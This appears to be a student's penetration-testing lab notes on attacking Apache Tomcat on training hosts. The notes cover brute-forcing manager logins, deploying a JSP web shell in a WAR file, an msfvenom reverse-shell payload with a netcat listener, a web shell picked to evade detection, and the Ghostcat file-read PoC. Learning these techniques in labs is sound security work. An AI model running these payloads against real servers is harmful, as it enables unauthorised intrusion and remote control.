As discussed in the previous section, if **we can access the `/manager` or `/host-manager` endpoints**, we can likely achieve remote code execution on the Tomcat server. 
Let's start by **brute-forcing the Tomcat manager page on the Tomcat instance at `http://web01.inlanefreight.local:8180`. We can use the [auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) Metasploit module** for these purposes, Burp Suite Intruder or any number of scripts to achieve this. We'll use Metasploit for our purposes.

# Tomcat Manager - Login Brute Force
---
- Again, we must **specify the vhost and the target's IP address to interact with the target properly**.
- We should also **==set `STOP_ON_SUCCESS` to `true` so the scanner stops when we get a successful login,==** no use in generating loads of additional requests after a successful login:
	- ![[Pasted image 20260719004150.png]]
- We hit `run` and **get a hit for the credential pair ==`tomcat:admin`**==.

## Tools selection
- Let's say a particular **Metasploit module (or another tool) is failing or not behaving the way we believe it should.** 
- We can always **==use Burp Suite or ZAP to proxy the traffic and troubleshoot==**. 
- To do this, first, **==fire up Burp Suite and then set the `PROXIES` option like the following:==**
	- `set PROXIES HTTP:127.0.0.1:8080` => Our burp proxy address
	- ![[Pasted image 20260719004429.png]]
- We can **==see in Burp exactly how the scanner is working, taking each credential pair and base64 encoding into account for basic auth==** that Tomcat uses.
	- ![[Pasted image 20260719004557.png]]
- A quick check of the value in the `Authorization` header for one request shows that the scanner is running correctly, **base64 encoding the credentials `admin:vagrant` the way the Tomcat application would do when a user attempts to log in directly from the web application.**
- Try this out for some examples throughout this module to start getting comfortable with debugging through a proxy.
	- ![[Pasted image 20260719004647.png]]

# Tomcat Manager - WAR File Upload
---
- This interface is available at **==`/manager/html` by default,==** which **==only users assigned the `manager-gui` role are allowed to access.==**
- **==Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file)==** and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage.

- After performing a brute force attack and answering questions 1 and 2 below, browse to `http://web01.inlanefreight.local:8180/manager/html` and enter the credentials.
	- ![[Pasted image 20260719005443.png]]

- The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility.
- A **JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive.*:
	- `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp`
	- `zip -r backup.war cmd.jsp `

- Click on `Browse` to select the .war file and then click on `Deploy`. 
- ![[Pasted image 20260719005551.png]]
- This file is uploaded to the manager GUI, **after which the `/backup` application will be added to the table.**
	- ![[Pasted image 20260719005622.png]]
- Browsing to **==`http://web01.inlanefreight.local:8180/backup/cmd.jsp` will present us with a web shell that we can use to run commands on the Tomcat server==**. 
- From here, we could upgrade our web shell to an interactive reverse shell and continue. Like previous examples, we can interact with this web shell via the browser or using `cURL` on the command line. Try both!

- To clean up after ourselves, we can go back to the main Tomcat Manager page and **click the `Undeploy` button next to the `backups` application after**

- We could also **==use `msfvenom` to generate a malicious WAR file.==** 
- The **==payload [java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) will execute a reverse shell through a JSP file.==** 
- Browse to the Tomcat console and deploy this file. Tomcat automatically extracts the WAR file contents and deploys it:
	- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war`

- Start a Netcat listener and **click on `/backup` to execute the shell:**
	- `nc -lnvp 4443`

- The **==[multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) Metasploit module can be used to automate==** the process shown above.


- **==[This](https://github.com/SecurityRiskAdvisors/cmd.jsp) JSP web shell is very lightweight (under 1kb) and utilizes a [Bookmarklet](https://www.freecodecamp.org/news/what-are-bookmarklets/) or browser bookmark==** to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded `cmd.jsp` would render nothing. 
- This is an **==excellent option to minimize our footprint and possibly evade detections for standard JSP==** web shells (though the JSP code may need to be modified a bit).
	- ![[Pasted image 20260719005941.png]]
- ![[Pasted image 20260719010000.png]]


# CVE-2020-1938 : Ghostcat
---
- Tomcat was found to be vulnerable to an **==unauthenticated LFI in a semi-recent discovery named [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938)==**. 
- All Tomcat **versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable**. This vulnerability was caused by a **misconfiguration in the AJP protocol used by Tomcat**. AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers.

- The **==AJP service is usually running at port 8009 on a Tomcat server==**. This can be checked with a targeted Nmap scan:
	- ![[Pasted image 20260719010116.png]]


- The ==PoC code for the vulnerability can be found [here](https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)==. Download the script and save it locally. 
- The exploit **==can only read files and folders within the web apps folder, which means that files like `/etc/passwd` can’t be accessed.==** Let’s attempt to access the web.xml:
	- `python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml `
	- ![[Pasted image 20260719010228.png]]
	- In some Tomcat installs, **we may be able to access sensitive data within the WEB-INF file.**